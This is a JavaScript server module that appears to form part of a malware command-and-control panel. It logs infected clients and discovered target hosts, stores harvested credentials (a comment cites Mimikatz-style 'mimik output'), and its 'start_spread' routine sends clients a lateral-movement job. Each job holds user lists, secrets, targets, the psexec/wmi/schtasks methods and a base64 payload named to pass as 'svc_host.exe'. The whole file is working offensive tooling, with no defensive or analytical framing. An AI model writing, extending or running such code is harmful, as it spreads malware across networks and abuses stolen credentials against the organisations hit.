function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

const DEFAULTS = {
  users: [],
  secrets: [],
  methods: ["psexec", "wmi", "schtasks"],
  maxHosts: 32,
  autoSpread: false,
  payloadB64: "",
  payloadName: "svc_host.exe",
};

export default {
  setup(ctx) {
    ctx.clients = new Map();
    ctx.spreadJobs = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT NOT NULL,
        ports TEXT,
        status TEXT DEFAULT 'new',
        detail TEXT,
        seen_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS targets_client ON targets(client_id)`);
    ctx.db.run(`CREATE UNIQUE INDEX IF NOT EXISTS targets_host ON targets(client_id, host)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS config (
        client_id TEXT PRIMARY KEY,
        config TEXT NOT NULL
      )`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "targets") {
      const list = Array.isArray(p) ? p : [];
      const tx = ctx.db.transaction(() => {
        const ins = ctx.db.prepare(
          `INSERT INTO targets (client_id, host, ports, status, seen_at)
           VALUES (?, ?, ?, 'new', ?)
           ON CONFLICT(client_id, host) DO UPDATE SET
             ports = excluded.ports,
             seen_at = excluded.seen_at`
        );
        for (const t of list) {
          ins.run(clientId, t.host, JSON.stringify(t.ports || []), now);
        }
      });
      tx();
      ctx.broadcast("targets", { clientId, targets: list });
    } else if (event === "host") {
      ctx.db.run(
        `UPDATE targets SET status = ?, detail = ? WHERE client_id = ? AND host = ?`,
        p.status || "unknown", p.detail || null, clientId, p.host
      );
      ctx.broadcast("host", { clientId, ...p });
    } else if (event === "progress") {
      ctx.broadcast("progress", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : { ...DEFAULTS };
    },

    save_config(ctx, params = {}) {
      const cfg = { ...DEFAULTS, ...(params.config || {}) };
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(cfg)
      );
      return { ok: true, config: cfg };
    },

    list_targets(ctx, params = {}) {
      return ctx.db
        .query(`SELECT host, ports, status, detail, seen_at AS seenAt FROM targets
                WHERE client_id = ? ORDER BY host`)
        .all(params.clientId || "")
        .map((r) => ({ ...r, ports: JSON.parse(r.ports || "[]") }));
    },

    clear_targets(ctx, params = {}) {
      ctx.db.run(`DELETE FROM targets WHERE client_id = ?`, params.clientId || "");
      return { ok: true };
    },

    // Called by the UI to kick off a spread run. The server assembles the
    // credential list from mimik output + saved config, then sends it down.
    async start_spread(ctx, params = {}) {
      const { clientId } = params;
      if (!clientId) throw new Error("clientId required");

      const cfgRow = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(clientId);
      const cfg = cfgRow ? { ...DEFAULTS, ...JSON.parse(cfgRow.config) } : { ...DEFAULTS };

      const targets = ctx.db
        .query(`SELECT host FROM targets WHERE client_id = ? AND status != 'infected'`)
        .all(clientId)
        .map((r) => r.host);

      if (!targets.length) throw new Error("no targets — run discover on the client first");
      if (!cfg.secrets || !cfg.secrets.length) throw new Error("no credentials configured");

      ctx.spreadJobs.set(clientId, { startedAt: Date.now() });
      ctx.broadcast("spread_started", { clientId, targets: targets.length });

      return {
        ok: true,
        job: {
          users: cfg.users || [],
          secrets: cfg.secrets || [],
          targets,
          methods: cfg.methods || DEFAULTS.methods,
          maxHosts: cfg.maxHosts || DEFAULTS.maxHosts,
          payloadB64: cfg.payloadB64 || "",
          payloadName: cfg.payloadName || DEFAULTS.payloadName,
        },
      };
    },

    finish_spread(ctx, params = {}) {
      ctx.spreadJobs.delete(params.clientId);
      return { ok: true };
    },
  },
};
